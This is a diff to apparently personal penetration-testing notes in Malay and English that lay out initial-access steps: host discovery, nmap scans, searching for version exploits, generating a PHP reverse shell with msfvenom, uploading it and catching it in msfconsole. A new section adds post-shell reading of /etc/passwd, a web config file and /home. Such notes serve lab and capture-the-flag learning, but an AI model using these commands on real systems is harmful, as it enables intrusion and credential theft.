@@ -1,4 +1,4 @@
-basic reconnaisance, semua dalam turutan
+basic reconnaisance, semua dalam turutan.. ini step untuk dapatkan initial access (dapatkan shell)
 ## 1. cari IP target
 `sudo netdiscover`
 
@@ -14,9 +14,10 @@ sudo nmap -sC -sV -A -O IP // scan lambat, tapi detail
 - sometimes step ni tak dpt hasil
 cth.
 `port/80 http apache 2.3.4`
-google: apache 2.3.4 exploit
-			apache 2.3.4 vulnerability
-			apache 2.3.4 exploit github
+
+google: ```apache 2.3.4 exploit
+	apache 2.3.4 vulnerability
+	apache 2.3.4 exploit github```
 
 ## if port 80 open, do this
 ### 1. cari directory/file dalam webserver
@@ -68,3 +69,8 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 then ubah url supaya pergi /uploads/shell.php
 - tengok msfconsole, kalau dapat connection tulis, `shell`
+
+## Step lepas dapat shell
+- check /etc/passwd file
+- check /var/www/main/config.php file
+- check /home directory
